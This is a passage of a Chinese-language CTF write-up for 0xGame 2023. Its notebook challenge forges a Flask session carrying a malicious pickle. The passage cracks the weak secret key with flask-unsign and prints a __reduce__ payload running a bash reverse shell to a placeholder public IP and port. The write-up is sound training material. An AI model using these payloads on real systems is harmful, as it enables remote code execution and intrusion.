class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.read())<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong password!&quot;</span>)<br>            exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checker</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(text) &gt; <span class="hljs-number">30</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Too long!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    setzip()<br>    password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input the base64-encoded password to decompress the 8848.zip: &quot;</span>)<br>    checker(password)<br>    <span class="hljs-keyword">try</span>:<br>        password = base64.b64decode(password)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;invalid base64 string!&#x27;</span>)<br>        exit()<br>    trydecode(password)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>zip长密码</p><p>ZIP 使用 PBKDF2，如果输入太大,它会 hash 输入 。该 hash（作为原始字节）成为实际密码。尝试使用 <code>SHA1 </code>对第一个密码进行 hash，并将十六进制摘要解码为<code> ASCII</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976510976-1697984727748-70.png" alt="1697976510976"></p><p><img src="/2023/10/22/0xGameCTF2023/1697976526674-1697984730893-72.png" alt="1697976526674"></p><p>payload：<code>SB05O+omkrB9vUYzyvrqA1LSZtg=</code></p><p><code>0xGame&#123;B07h_z1p_&amp;_8848_Can_h4v3_Two_P@ssw0rds&#125;</code></p><h3 id="勇者的奇妙冒险"><a href="#勇者的奇妙冒险" class="headerlink" title="勇者的奇妙冒险"></a>勇者的奇妙冒险</h3><blockquote><p>Hint 1: 似乎勇者还会点分身术<br>Hint 2: 也许勇者可以先放个分身在起点，自己拿到flag之后再传送回来</p></blockquote><p>用同样的账号名，开两个终端，一个在原地，一个走到中点，在原地的那边可以得到flag</p><p><img src="/2023/10/22/0xGameCTF2023/1697976701528-1697984747384-74.png" alt="1697976701528"></p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><p>先看一波源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()//表示用来加密session的serect_key是用两个字符的<span class="hljs-number">16</span>进制表示的，可以爆破<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, content</span>):<br>        self._name = name<br>        self._content = content<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">content</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_note</span>(<span class="hljs-params">note_id</span>):<br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    note_raw = notes.get(note_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    note = pickle.loads(note_raw)//存在pickle反序列化漏洞，可以伪造session<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.name, note_content=note.content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>():<br>    note_name = request.form.get(<span class="hljs-string">&#x27;note_name&#x27;</span>)<br>    note_content = request.form.get(<span class="hljs-string">&#x27;note_content&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)<br>    <br>    note_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    note = Note(note_name, note_content)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;notes&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;<br>    <br>    notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]<br>    notes[note_id] = pickle.dumps(note)<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_success&#x27;</span>, note_id=note_id)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>():<br>    note_id = request.form.get(<span class="hljs-string">&#x27;note_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.get(note_id):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    <span class="hljs-keyword">del</span> notes[note_id]<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_success&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>先生成一下爆破用的字典，以备后用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">hex_dict = []<br><br><span class="hljs-comment"># 生成两个字节的所有十六进制情况</span><br><span class="hljs-keyword">for</span> byte1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> byte2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_representation = <span class="hljs-string">f&quot;&#x27;<span class="hljs-subst">&#123;byte1:02x&#125;</span><span class="hljs-subst">&#123;byte2:02x&#125;</span>&#x27;&quot;</span>  <span class="hljs-comment"># 生成带有单引号的小写字母的十六进制表示</span><br>        hex_dict.append(hex_representation)  <span class="hljs-comment"># 将带有单引号的十六进制表示添加到列表</span><br><br><span class="hljs-comment"># 将列表写入 txt 文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hex_dict.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> hex_dict:<br>        file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;item&#125;</span>\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以得到字典文件hex_dict.txt</p><p>之后先得到session值，再用flask-unsign工具爆破得到key</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">flask-unsign --unsign --wordlist <span class="hljs-string">&quot;E:<span class="hljs-subst">\\</span>CTF<span class="hljs-subst">\\</span>Competition<span class="hljs-subst">\\</span>0xGame2023<span class="hljs-subst">\\</span>notebook<span class="hljs-subst">\\</span>notebook<span class="hljs-subst">\\</span>hex_dict.txt&quot;</span> --cookie &lt; <span class="hljs-string">&quot;E:<span class="hljs-subst">\\</span>CTF<span class="hljs-subst">\\</span>Competition<span class="hljs-subst">\\</span>0xGame2023<span class="hljs-subst">\\</span>notebook<span class="hljs-subst">\\</span>notebook<span class="hljs-subst">\\</span>a.txt&quot;</span><br></code></pre></td></tr></table></figure><p>解密之后的session是这样的</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#123;&#x27;notes&#x27;: &#123;&#x27;<span class="hljs-number">0514</span>b<span class="hljs-number">9</span>ce<span class="hljs-number">-26e3</span><span class="hljs-number">-4</span>ea<span class="hljs-number">8</span>-a<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-number">-56880</span>a<span class="hljs-number">2</span>ba<span class="hljs-number">082</span>&#x27;: b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>J\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>__main__\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>Note\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>)\<span class="hljs-keyword">x</span><span class="hljs-number">81</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">0</span><br><span class="hljs-number">5</span>_name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>Whhxy<span class="hljs-number">4</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>_content\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">0</span>ei want flaaaag\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>ub.&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">18</span>bc<span class="hljs-number">941</span>b-b<span class="hljs-number">04e-4</span>efb<span class="hljs-number">-9716</span><span class="hljs-number">-983</span>ad<span class="hljs-number">99e1</span>aad&#x27;: b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>J\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>__main__\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<br><span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>Note\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>)\<span class="hljs-keyword">x</span><span class="hljs-number">81</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">05</span>_name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>Whhxy<span class="hljs-number">4</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>_content\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">0</span>ei want flaaaag\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>ub.&#x27;&#125;&#125;<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>J\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>__main__\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>Note\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>)\<span class="hljs-keyword">x</span><span class="hljs-number">81</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">0</span><br><span class="hljs-number">5</span>_name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>Whhxy<span class="hljs-number">4</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>_content\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">0</span>ei want flaaaag\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>ub.&#x27;<br></code></pre></td></tr></table></figure><p>就是pickle序列化结果，也是我们要注入的地方，首先我们去写一个代命令执行的pickle序列化的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name=<span class="hljs-string">&quot;s&quot;</span><br>        self.content=<span class="hljs-string">&quot;sa&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>): <br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/公网ip/port 0&gt;&amp;1&#x27;&quot;</span>,))<br><br><span class="hljs-comment"># 创建一个MaliciousObject实例</span><br>note = Note()<br><br><span class="hljs-comment"># 序列化这个对象</span><br>serialized_data = pickle.dumps(note)<br><span class="hljs-built_in">print</span>(serialized_data)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x95</span>O<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x8c<span class="hljs-char escape_">\x02</span>nt<span class="hljs-char escape_">\x94</span>\x8c<span class="hljs-char escape_">\x06</span>system<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x94</span>\x8c7bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x85</span><span class="hljs-char escape_">\x94</span>R<span class="hljs-char escape_">\x94</span>.&quot;</span><br></code></pre></td></tr></table></figure><p>将得到的字符串拼接到session，即得到</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;&#x27;<span class="hljs-variable">notes</span>&#x27;: &#123;&#x27;<span class="hljs-number">0514</span>b9ce<span class="hljs-number">-26e3</span><span class="hljs-number">-4</span>ea8<span class="hljs-operator">-</span><span class="hljs-variable">a0c8</span><span class="hljs-number">-56880</span>a2ba082&#x27;: <span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x95</span>O<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x8c<span class="hljs-char escape_">\x02</span>nt<span class="hljs-char escape_">\x94</span>\x8c<span class="hljs-char escape_">\x06</span>system<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x94</span>\x8c7bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x85</span><span class="hljs-char escape_">\x94</span>R<span class="hljs-char escape_">\x94</span>.&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>再将这段代码去去用flask_session_cookie_manager3.py脚本加密</p><p>使用方法如下</p><p>encode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">usage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;<br><br>optional arguments:<br>  -h, --help            show this help message and exit<br>  -s &lt;string&gt;, --secret-key &lt;string&gt;<br>                        Secret key<br>  -t &lt;string&gt;, --cookie-structure &lt;string&gt;<br>                        Session cookie structure<br></code></pre></td></tr></table></figure><p>decode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">usage: flask_session_cookie_manager&#123;2,3&#125;.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;<br><br>optional arguments:<br>  -h, --help            show this help message and exit<br>  -s &lt;string&gt;, --secret-key &lt;string&gt;<br>                        Secret key<br>  -c &lt;string&gt;, --cookie-value &lt;string&gt;<br>                        Session cookie value<br></code></pre></td></tr></table></figure><p>加密语句</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">python3</span> <span class="hljs-variable">flask_session_cookie_manager3</span>.<span class="hljs-property">py</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">-</span><span class="hljs-variable">s</span> &#x27;<span class="hljs-variable">key</span>的值&#x27; <span class="hljs-operator">-</span><span class="hljs-variable">t</span> <span class="hljs-string">&quot;&#123;&#x27;notes&#x27;: &#123;&#x27;35903b6c-1ea3-4d6d-bc27-3da12c567646&#x27;: b&#x27;<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x95</span>N<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x8c<span class="hljs-char escape_">\x05</span>posix<span class="hljs-char escape_">\x94</span>\x8c<span class="hljs-char escape_">\x06</span>system<span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x94</span>\x8c3bash -c <span class="hljs-char escape_">\&quot;</span>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x94</span><span class="hljs-char escape_">\x85</span><span class="hljs-char escape_">\x94</span>R<span class="hljs-char escape_">\x94</span>.&#x27;&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;其中&quot;是为了转义”不然会报错</p><p>上传之后</p><p>得到</p><p>之后就是为所欲为了</p><h3 id="zip-file-manager"><a href="#zip-file-manager" class="headerlink" title="zip_file_manager"></a>zip_file_manager</h3><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect, send_file<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><br>app = 